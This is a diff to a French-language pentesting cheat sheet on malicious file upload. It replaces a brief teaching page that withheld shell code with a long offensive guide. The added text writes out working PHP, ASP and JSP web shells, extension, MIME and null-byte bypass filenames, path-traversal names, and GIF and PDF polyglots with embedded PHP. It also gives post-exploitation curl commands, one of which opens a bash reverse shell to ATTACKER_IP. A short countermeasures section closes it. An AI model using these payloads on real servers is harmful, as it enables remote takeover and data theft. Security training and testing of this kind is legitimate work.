@@ -4,53 +4,292 @@ date: "2025-07-15"
 draft: false
 ---
 
-# 🗂️ Malicious File Upload
+# 📁 Malicious File Upload - Cheat Sheet
 
-## Qu'est-ce qu'un Malicious File Upload ?
-
-L'upload de fichiers malveillants consiste à transférer sur un serveur des fichiers conçus pour exécuter du code ou compromettre la sécurité du système. Cette technique est souvent utilisée pour obtenir un accès non autorisé ou exécuter des commandes à distance.
-
-## 🎯 Objectifs pédagogiques
-
-- Comprendre les risques liés à l'upload de fichiers
-- Savoir identifier et exploiter une faille d'upload
-
-## 📋 Exemples de scénarios et commandes
-
-- Envoyer un fichier avec une extension inattendue pour contourner les filtres (ex : `.jpg.php`)
-- Tester l'upload de fichiers avec des outils automatisés
-- Exploiter une mauvaise configuration de droits d'accès
-
-## 🛠️ Outils et commandes les plus utilisés
-
-- **Burp Suite** : Intercepter et modifier les requêtes d'upload
-- **curl** :
-  ```bash
-  curl -F 'file=@test.jpg' http://site-vulnerable/upload.php
-  ```
-- **wfuzz / gobuster** : Brute force des extensions ou endpoints d'upload
-  ```bash
-  wfuzz -c -w wordlist.txt --hc 404 http://site-vulnerable/upload/FUZZ
-  gobuster dir -u http://site-vulnerable/ -w wordlist.txt -x php,asp,jpg
-  ```
-- **exiftool** : Modifier les métadonnées d'un fichier image
-  ```bash
-  exiftool -Comment='test' image.jpg
-  ```
-- **php-reverse-shell** : Utiliser un shell PHP pour prise de contrôle (ne pas inclure le code, voir le dépôt officiel)
-  [php-reverse-shell (GitHub)](https://github.com/pentestmonkey/php-reverse-shell)
-
-## 🛡️ Bonnes pratiques
-
-- Restreindre les types de fichiers acceptés
-- Mettre en place une validation côté serveur
-- Désactiver l'exécution dans les dossiers d'upload
-
-## 📚 Ressources utiles
-
-- [OWASP - File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
-- [HackTricks - File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload)
+## 🎯 Vue d'ensemble
+Les vulnérabilités d'upload de fichiers malveillants permettent d'uploader et d'exécuter du code arbitraire sur un serveur web via des fonctionnalités d'upload non sécurisées.
 
 ---
 
-_Dernière mise à jour : 15 juillet 2025_
+## 🔍 Détection et Énumération
+
+### Identification des Points d'Upload
+```bash
+# Recherche de formulaires d'upload
+# Pourquoi : Identifier les fonctionnalités d'upload sur le site
+grep -r "file.*upload\|upload.*file" /var/www/html/
+find /var/www/html/ -name "*.php" -exec grep -l "upload" {} \;
+
+# Analyse des extensions autorisées
+# Pourquoi : Comprendre les restrictions de fichiers
+grep -r "\.jpg\|\.png\|\.gif\|\.pdf" /var/www/html/
+```
+
+### Tests de Validation
+```bash
+# Test des extensions de fichiers
+# Pourquoi : Vérifier si les extensions sont correctement validées
+file.jpg.php
+file.php.jpg
+file.php%00.jpg
+file.php;.jpg
+```
+
+---
+
+## 🛠️ Techniques d'Upload
+
+### Bypass d'Extensions
+```bash
+# Double extension
+# Pourquoi : Contourner les filtres qui vérifient seulement la fin du nom
+shell.php.jpg
+shell.php.png
+shell.php.gif
+
+# Extension avec point
+# Pourquoi : Certains systèmes ne gèrent pas les points multiples
+shell.php.
+shell.php..
+
+# Extension avec espace
+# Pourquoi : Les espaces peuvent être mal gérés
+shell.php 
+shell.php%20
+```
+
+### Bypass de MIME Type
+```bash
+# Modification du Content-Type
+# Pourquoi : Contourner la validation du type MIME
+Content-Type: image/jpeg  # Pour un fichier PHP
+Content-Type: application/pdf  # Pour un fichier PHP
+
+# Headers HTTP modifiés
+# Pourquoi : Masquer le vrai type de fichier
+Accept: image/*,application/*
+```
+
+### Bypass de Contenu
+```php
+<?php
+// Code PHP masqué dans une image
+// Pourquoi : Créer un fichier qui ressemble à une image mais contient du code
+GIF89a;
+<?php system($_GET['cmd']); ?>
+?>
+```
+
+---
+
+## 📁 Types de Fichiers Malveillants
+
+### Web Shells PHP
+```php
+<?php
+// Shell simple
+// Pourquoi : Exécuter des commandes système via le web
+system($_GET['cmd']);
+
+// Shell avec interface
+// Pourquoi : Interface web pour naviguer et exécuter des commandes
+if(isset($_GET['cmd'])) {
+    echo "<pre>";
+    system($_GET['cmd']);
+    echo "</pre>";
+}
+?>
+
+// Shell avec upload
+// Pourquoi : Permettre l'upload d'autres fichiers malveillants
+<?php
+if(isset($_FILES['file'])) {
+    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
+}
+?>
+```
+
+### Web Shells ASP/ASPX
+```asp
+<%
+' Shell ASP
+' Pourquoi : Exécuter des commandes sur des serveurs Windows
+Response.Write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.ReadAll()
+%>
+```
+
+### Web Shells JSP
+```jsp
+<%@ page import="java.util.*,java.io.*"%>
+<%
+// Shell JSP
+// Pourquoi : Exécuter des commandes sur des serveurs Java
+if (request.getParameter("cmd") != null) {
+    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
+    OutputStream os = p.getOutputStream();
+    InputStream in = p.getInputStream();
+    DataInputStream dis = new DataInputStream(in);
+    String disr = dis.readLine();
+    while ( disr != null ) {
+        out.println(disr);
+        disr = dis.readLine();
+    }
+}
+%>
+```
+
+---
+
+## 🔧 Outils d'Exploitation
+
+### Burp Suite
+```bash
+# Intercepter les requêtes d'upload
+# Pourquoi : Analyser et modifier les requêtes d'upload
+# 1. Intercepter la requête POST d'upload
+# 2. Modifier le nom de fichier et le Content-Type
+# 3. Envoyer la requête modifiée
+
+# Exemple de modification
+# Nom original: image.jpg
+# Nom modifié: shell.php.jpg
+# Content-Type: image/jpeg → application/x-php
+```
+
+### OWASP ZAP
+```bash
+# Scanner automatique d'upload
+# Pourquoi : Détecter automatiquement les vulnérabilités d'upload
+# 1. Configurer le scanner
+# 2. Pointer vers les formulaires d'upload
+# 3. Lancer le scan
+```
+
+### Custom Scripts
+```python
+#!/usr/bin/env python3
+# Script d'upload automatique
+# Pourquoi : Automatiser les tests d'upload
+
+import requests
+
+def upload_file(url, file_path, payload):
+    files = {'file': (payload, open(file_path, 'rb'), 'image/jpeg')}
+    response = requests.post(url, files=files)
+    return response.text
+```
+
+---
+
+## 🎯 Techniques Avancées
+
+### Polyglot Files
+```bash
+# Créer un fichier polyglot
+# Pourquoi : Créer un fichier valide dans plusieurs formats
+# Exemple: GIF + PHP
+GIF89a<?php system($_GET['cmd']); ?>
+
+# Exemple: PDF + PHP
+%PDF-1.4
+<?php system($_GET['cmd']); ?>
+```
+
+### Null Byte Injection
+```bash
+# Injection de null byte
+# Pourquoi : Tronquer le nom de fichier après le null byte
+shell.php%00.jpg
+shell.php\x00.jpg
+```
+
+### Path Traversal
+```bash
+# Upload avec path traversal
+# Pourquoi : Uploader dans des répertoires non autorisés
+../../../shell.php
+..\..\..\shell.php
+```
+
+---
+
+## 🔍 Post-Exploitation
+
+### Localisation du Fichier
+```bash
+# Recherche du fichier uploadé
+# Pourquoi : Trouver où le fichier a été uploadé
+find /var/www/html/ -name "*.php" -newer /tmp/reference
+find /var/www/html/ -name "*upload*" -type d
+
+# Vérification des permissions
+# Pourquoi : S'assurer que le fichier est exécutable
+ls -la /var/www/html/uploads/
+chmod +x /var/www/html/uploads/shell.php
+```
+
+### Exécution du Shell
+```bash
+# Accès au shell
+# Pourquoi : Obtenir un shell via le fichier uploadé
+curl "http://target.com/uploads/shell.php?cmd=whoami"
+wget "http://target.com/uploads/shell.php?cmd=id"
+
+# Reverse shell
+# Pourquoi : Créer une connexion shell inversée
+curl "http://target.com/uploads/shell.php?cmd=bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
+```
+
+---
+
+## 🛡️ Contre-Mesures
+
+### Validation des Extensions
+```php
+<?php
+// Validation stricte des extensions
+// Pourquoi : Empêcher l'upload de fichiers dangereux
+$allowed = array('jpg', 'jpeg', 'png', 'gif');
+$filename = $_FILES['file']['name'];
+$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
+
+if (!in_array($ext, $allowed)) {
+    die('Extension non autorisée');
+}
+?>
+```
+
+### Validation du Contenu
+```php
+<?php
+// Vérification du contenu du fichier
+// Pourquoi : Détecter les fichiers malveillants même avec une extension valide
+$content = file_get_contents($_FILES['file']['tmp_name']);
+if (strpos($content, '<?php') !== false) {
+    die('Contenu PHP détecté');
+}
+?>
+```
+
+### Configuration Serveur
+```apache
+# .htaccess pour bloquer l'exécution
+# Pourquoi : Empêcher l'exécution de PHP dans les dossiers d'upload
+<Directory "/var/www/html/uploads">
+    php_flag engine off
+    AddType text/plain .php .php3 .php4 .php5
+</Directory>
+```
+
+---
+
+## 📚 Ressources
+
+- **OWASP File Upload** : https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
+- **HackTricks File Upload** : https://book.hacktricks.xyz/pentesting-web/file-upload
+- **PayloadsAllTheThings File Upload** : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
+- **File Upload Cheat Sheet** : https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
+
+---
+
+_Dernière mise à jour : 15 juillet 2025_ 
